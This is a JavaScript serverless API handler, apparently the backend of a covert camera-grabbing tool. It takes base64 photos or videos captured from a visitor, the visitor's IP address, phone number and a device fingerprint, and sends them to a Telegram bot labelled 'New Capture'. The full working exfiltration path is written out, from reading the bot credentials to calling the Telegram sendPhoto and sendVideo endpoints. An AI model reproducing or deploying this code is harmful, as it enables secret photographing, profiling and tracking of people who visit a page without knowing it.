export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { type, image, video, fingerprint } = req.body;
    if (!type) return res.status(400).json({ error: 'Missing type' });
    if (type === 'image' && !image) return res.status(400).json({ error: 'No image' });
    if (type === 'video' && !video) return res.status(400).json({ error: 'No video' });

    // Get token & chat ID from env vars (or files)
    let BOT_TOKEN = process.env.BOT_TOKEN;
    let CHAT_ID = process.env.CHAT_ID;
    if (!BOT_TOKEN || !CHAT_ID) {
        try {
            const fs = require('fs');
            const path = require('path');
            BOT_TOKEN = fs.readFileSync(path.join(process.cwd(), 'token.txt'), 'utf8').trim();
            CHAT_ID = fs.readFileSync(path.join(process.cwd(), 'uid.txt'), 'utf8').trim();
        } catch (e) {
            return res.status(500).json({ error: 'Bot config missing' });
        }
    }

    // Extract IP
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';

    // Format fingerprint into a nice caption
    const f = fingerprint || {};
    const caption = `📱 **New Capture**\n` +
        `━━━━━━━━━━━━━━━\n` +
        `📞 Phone: **${f.phone || 'N/A'}**\n` +
        `🌐 IP: \`${ip}\`\n` +
        `💻 OS: ${f.platform || 'N/A'}\n` +
        `🖥️ Screen: ${f.screen || 'N/A'}\n` +
        `🕐 Timezone: ${f.timezone || 'N/A'}\n` +
        `⚙️ CPU Cores: ${f.cores || 'N/A'}\n` +
        `🧠 Memory: ${f.memory || 'N/A'} GB\n` +
        `🔗 Referrer: ${f.referrer || 'Direct'}\n` +
        `👁️ Viewport: ${f.viewport || 'N/A'}\n` +
        `━━━━━━━━━━━━━━━\n` +
        `🕒 Captured: ${new Date().toLocaleString()}`;

    // Build request to Telegram
    let form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', caption);
    form.append('parse_mode', 'Markdown');

    if (type === 'image') {
        const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ''), 'base64');
        form.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'capture.jpg');
    } else if (type === 'video') {
        const buffer = Buffer.from(video, 'base64');
        form.append('video', new Blob([buffer], { type: 'video/webm' }), 'capture.webm');
    }

    try {
        const endpoint = type === 'image'
            ? `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`
            : `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;

        const response = await fetch(endpoint, { method: 'POST', body: form });
        const data = await response.json();
        if (!response.ok) {
            console.error('Telegram error:', data);
            return res.status(500).json({ error: `Telegram: ${data.description}` });
        }
        res.status(200).json({ status: 'ok' });
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: error.message });
    }
}
